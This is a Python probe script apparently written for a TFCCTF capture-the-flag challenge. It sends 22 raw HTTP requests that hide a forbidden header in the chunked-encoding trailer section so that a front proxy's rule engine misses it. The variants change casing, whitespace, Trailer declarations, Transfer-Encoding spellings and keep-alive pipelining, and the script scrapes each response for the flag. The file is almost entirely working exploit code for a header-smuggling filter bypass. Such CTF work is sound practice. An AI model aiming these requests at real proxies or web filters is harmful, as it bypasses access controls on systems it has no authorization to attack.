#!/usr/bin/env python3
"""
Trailer-sink probe set for mccrab3.

Hypothesis under test: our local image was rebuilt today from an unpinned
`pip3 install gunicorn flask`; the live image was built ~2026-08-29 from the same line.
Every prior fingerprint compared PARSER STRICTNESS. None tested the trailer SINK.

proxoxy's rule engine provably doesn't inspect the chunked trailer section (fresh local
HeaderBlock in parse_chunked_body, dropped at 0x123445). So if the backend gunicorn folds
`req.trailers` into the WSGI environ, `brevski: george` placed in a trailer is the whole solve.

Usage:
    python3 trailers.py <host> <port>

Sequential, one connection per variant, no fuzzing loop. Run locally first so every remote
row has a paired local control on identical bytes.
"""
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 28888


def send(raw, timeout=6.0):
    out = b""
    try:
        s = socket.create_connection((HOST, PORT), timeout)
        s.settimeout(timeout)
        s.sendall(raw)
        while True:
            try:
                d = s.recv(65536)
            except (socket.timeout, TimeoutError):
                break
            if not d:
                break
            out += d
        s.close()
    except OSError as e:
        return b"<CONNERR " + repr(e).encode() + b">"
    return out


def head(extra=b"", conn=b"close", te=b"chunked"):
    h = b"POST /flag HTTP/1.1\r\nHost: h\r\n"
    if te:
        h += b"Transfer-Encoding: " + te + b"\r\n"
    h += extra
    h += b"Connection: " + conn + b"\r\n\r\n"
    return h


def body(trailers=b"", prechunk=None):
    b = b""
    if prechunk:
        b += b"%x\r\n%s\r\n" % (len(prechunk), prechunk)
    b += b"0\r\n" + trailers + b"\r\n"
    return b


VARIANTS = []


def V(name, raw):
    VARIANTS.append((name, raw))


# 0. the exact packet that was proposed and approved
V("00 proposed exact",
  b"POST /flag HTTP/1.1\r\nHost: h\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
  b"0\r\nbrevski: george\r\n\r\n")

# 1-4. trailer name casing
for tag, nm in (("01", b"brevski"), ("02", b"Brevski"), ("03", b"BREVSKI"), ("04", b"bReVsKi")):
    V("%s name %s" % (tag, nm.decode()), head() + body(nm + b": george\r\n"))

# 5-6. with a Trailer: declaration in the head (validate_trailer_declaration @0x124e67)
V("05 declared Trailer: brevski",
  head(extra=b"Trailer: brevski\r\n") + body(b"brevski: george\r\n"))
V("06 declared Trailer: brevski, x",
  head(extra=b"Trailer: brevski, x\r\n") + body(b"brevski: george\r\nx: 1\r\n"))

# 7-9. value whitespace
V("07 value no space", head() + body(b"brevski:george\r\n"))
V("08 value leading tab", head() + body(b"brevski:\tgeorge\r\n"))
V("09 value trailing space", head() + body(b"brevski: george \r\n"))

# 10-11. a real chunk before the terminator
V("10 one chunk then trailer", head() + body(b"brevski: george\r\n", prechunk=b"HELLO"))
V("11 two chunks then trailer",
  head() + b"3\r\nAAA\r\n" + body(b"brevski: george\r\n", prechunk=b"BBBB"))

# 12-13. TE spellings proxoxy accepts
V("12 TE identity,chunked", head(te=b"identity, chunked") + body(b"brevski: george\r\n"))
V("13 TE chunked,chunked", head(te=b"chunked, chunked") + body(b"brevski: george\r\n"))

# 14-16. duplicated / accompanied trailers
V("14 trailer twice", head() + body(b"brevski: george\r\nbrevski: george\r\n"))
V("15 other trailer first", head() + body(b"x-a: 1\r\nbrevski: george\r\n"))
V("16 other trailer after", head() + body(b"brevski: george\r\nx-a: 1\r\n"))

# 17-18. keep-alive instead of close (finish_body / _keepalive_after path)
V("17 keep-alive", head(conn=b"keep-alive") + body(b"brevski: george\r\n"))
V("18 keep-alive + follow-up",
  head(conn=b"keep-alive") + body(b"brevski: george\r\n")
  + b"POST /flag HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")

# 19-20. controls
V("19 CONTROL trailer zzz (must 500)", head() + body(b"brevski: zzz\r\n"))
V("20 CONTROL head brevski (must be eaten)",
  b"POST /flag HTTP/1.1\r\nHost: h\r\nbrevski: george\r\n"
  b"Content-Length: 0\r\nConnection: close\r\n\r\n")
V("21 CONTROL benign (must 500, app returns None)",
  b"POST /flag HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
V("22 CONTROL health (must 200 OK)",
  b"GET /health HTTP/1.1\r\nHost: h\r\nConnection: close\r\n\r\n")


def main():
    print("target %s:%d   %d variants" % (HOST, PORT, len(VARIANTS)))
    hits = []
    for name, raw in VARIANTS:
        out = send(raw)
        status = out.split(b"\r\n")[0][:34].decode("latin-1") if out else "<no bytes>"
        flag = b"TFCCTF{" in out
        print("%-40s %-34s len=%-5d %s" % (name, status, len(out), "*** FLAG ***" if flag else ""))
        if flag:
            i = out.find(b"TFCCTF{")
            hits.append(out[i:out.find(b"}", i) + 1].decode("latin-1"))
    if hits:
        print("\nFLAGS:", hits)
    else:
        print("\nno flag in any variant")
    return hits


if __name__ == "__main__":
    main()
